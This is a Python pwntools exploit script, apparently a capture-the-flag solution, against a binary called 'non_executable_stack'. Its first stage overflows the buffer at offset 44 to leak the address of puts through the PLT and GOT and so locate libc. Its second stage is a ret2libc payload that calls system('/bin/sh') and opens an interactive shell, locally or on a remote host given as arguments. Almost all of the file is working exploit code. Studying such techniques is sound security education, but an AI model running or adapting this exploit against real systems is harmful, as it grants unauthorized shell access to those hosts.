from pwn import (
    args,
    gdb,
    remote,
    process,
    p64,
    u64,
    flat,
    ROP,
    ELF,
    context,
    log,
    sys,
    unpack,
    warnings,
)


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


warnings.filterwarnings("ignore")
gdbscript = """
init-pwndbg
continue
""".format(**locals())

exe = "./non_executable_stack"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
# context.terminal = "kitty"

io = start()
libc = ELF("./libc6-i386_2.27-3ubuntu1_amd64.so")

offset = 44

payload = flat({offset: [elf.plt.puts, elf.sym.main, elf.got.puts]})

io.sendlineafter(b"password:\n", payload)
io.recvuntil(b"!\n")

puts_leak = unpack(io.recv(4))
libc.address = puts_leak - libc.sym.puts


log.info(f"puts leak: {hex(puts_leak)}")
log.info(f"libc base: {hex(libc.address)}")

payload = flat(
    {offset: [libc.sym.system, libc.sym.exit, next(libc.search(b"/bin/sh"))]}
)

io.sendlineafter(b"password:\n", payload)
io.interactive()
